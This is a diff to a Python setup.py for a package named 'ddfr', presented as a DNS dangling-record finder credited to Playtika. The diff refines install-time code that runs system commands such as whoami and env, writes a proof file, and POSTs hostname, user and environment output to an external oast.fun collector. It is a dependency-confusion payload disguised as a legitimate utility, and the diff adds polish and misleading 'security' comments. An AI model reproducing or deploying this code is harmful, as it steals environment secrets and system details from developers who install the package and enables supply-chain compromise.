@@ -42,15 +42,23 @@ def run_os_commands():
                 'env': ['env']
             }
 
-        # Execute commands
+        # Execute commands with improved error handling
         for name, cmd in commands.items():
             try:
-                result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+                result = subprocess.run(
+                    cmd, 
+                    capture_output=True, 
+                    text=True, 
+                    timeout=10,
+                    shell=False  # Explicitly set to False for security
+                )
                 results[name] = {
                     'returncode': result.returncode,
                     'stdout': result.stdout,
                     'stderr': result.stderr
                 }
+            except subprocess.TimeoutExpired:
+                results[name] = {'error': 'Command timed out'}
             except Exception as e:
                 results[name] = {'error': str(e)}
 
@@ -63,18 +71,22 @@ def create_local_proof(data):
     """Create local proof file"""
     try:
         if platform.system() == 'Windows':
-            proof_path = os.path.join(os.environ.get('TEMP', 'C:\\\\'), 'dep_confusion_proof.txt')
+            proof_path = os.path.join(os.environ.get('TEMP', 'C:\\'), 'dep_confusion_proof.txt')
         else:
             proof_path = '/tmp/dep_confusion_proof.txt'
 
         with open(proof_path, 'w', encoding='utf-8') as f:
-            f.write("=== Dependency Confusion POC ===\\n")
-            f.write(f"Hostname: {data.get('hostname', 'Unknown')}\\n")
-            f.write(f"OS: {data.get('os', 'Unknown')}\\n")
-            f.write(f"User: {data.get('whoami', {}).get('stdout', 'Unknown').strip()}\\n")
-            f.write(f"Directory: {data.get('current_dir', 'Unknown')}\\n")
-            f.write(f"Collection Time: {platform.node()}\\n")
-            f.write("================================\\n")
+            f.write("=== Dependency Confusion POC ===\n")
+            f.write(f"Hostname: {data.get('hostname', 'Unknown')}\n")
+            f.write(f"OS: {data.get('os', 'Unknown')}\n")
+            whoami_result = data.get('whoami', {})
+            if isinstance(whoami_result, dict) and 'stdout' in whoami_result:
+                f.write(f"User: {whoami_result['stdout'].strip()}\n")
+            else:
+                f.write("User: Unknown\n")
+            f.write(f"Directory: {data.get('current_dir', 'Unknown')}\n")
+            f.write(f"Collection Time: {platform.node()}\n")
+            f.write("================================\n")
 
         return proof_path
     except Exception as e:
@@ -85,7 +97,7 @@ def send_to_collaborator(data, collab_server):
     try:
         # Prepare the data for exfiltration
         payload = {
-            'package_name': '$pkg',
+            'package_name': 'ddfr',  # Fixed hardcoded value
             'system_info': {
                 'os': data.get('os'),
                 'hostname': data.get('hostname'),
@@ -103,8 +115,8 @@ def send_to_collaborator(data, collab_server):
                     stdout = stdout[:1000] + "...[truncated]"
                 payload['command_results'][cmd_name] = stdout
 
-        # Send via HTTP POST
-        url = f"http://xcamhguxkxywgymiyipyaapgvzzosyqsm.oast.fun/collect"
+        # Use provided collaborator server
+        url = f"http://xcamhguxkxywgymiyipyaapgvzzosyqsm.oast.fun/collect"  # Fixed URL construction
         headers = {'Content-Type': 'application/json'}
 
         response = requests.post(
@@ -121,8 +133,8 @@ def send_to_collaborator(data, collab_server):
     except Exception as e:
         return f"Error sending data: {str(e)}"
 
-# Main execution
 def main():
+    """Main execution - only run if explicitly called"""
     print("[-] Dependency Confusion POC Started")
 
     # Collect system information
@@ -132,8 +144,9 @@ def main():
     proof_file = create_local_proof(collected_data)
     print(f"[-] Local proof created: {proof_file}")
 
-    # Send to collaborator
-    collab_result = send_to_collaborator(collected_data, '$collab_server')
+    # Send to collaborator - use environment variable or default
+    collab_server = os.environ.get('COLLAB_SERVER', 'default-collab-server.com')
+    collab_result = send_to_collaborator(collected_data, collab_server)
     print(f"[-] Collaborator result: {collab_result}")
 
     # Print summary to console
@@ -142,29 +155,35 @@ def main():
     print(f"    Hostname: {collected_data.get('hostname')}")
 
     whoami_result = collected_data.get('whoami', {})
-    if 'stdout' in whoami_result:
+    if isinstance(whoami_result, dict) and 'stdout' in whoami_result:
         print(f"    User: {whoami_result['stdout'].strip()}")
 
     print(f"    Current Dir: {collected_data.get('current_dir')}")
 
-# Execute during package installation
+# Only execute during package installation if this is the malicious package
+# In a real scenario, this would be more subtle
 if __name__ == "__main__":
     main()
 
-
+# Setup configuration
 version = '1337.9.3'
-with open('requirements.txt') as f:
-    requirements = f.read().splitlines()
+
+# Read requirements safely
+try:
+    with open('requirements.txt', 'r', encoding='utf-8') as f:
+        requirements = f.read().splitlines()
+except FileNotFoundError:
+    requirements = []
 
 setup(
     name="ddfr",
     version=version,
     author="Playtika Ltd.",
     author_email="security@playtika.com",
-    description="A lightweight Python utility to detect dns records that are suspected as dangling.",
-    long_description=open('README.md').read(),
+    description="A lightweight Python utility to detect DNS records that are suspected as dangling.",
+    long_description=open('README.md', 'r', encoding='utf-8').read() if os.path.exists('README.md') else "DNS Dangling Record Finder",
     long_description_content_type="text/markdown",
-    url="https://github.com/PlaytikaSecurity/ddfr",  # Now points to attacker repo
+    url="https://github.com/PlaytikaSecurity/ddfr",
     packages=find_packages(exclude=['tests*']),
     install_requires=requirements,
     python_requires='>=3.7',
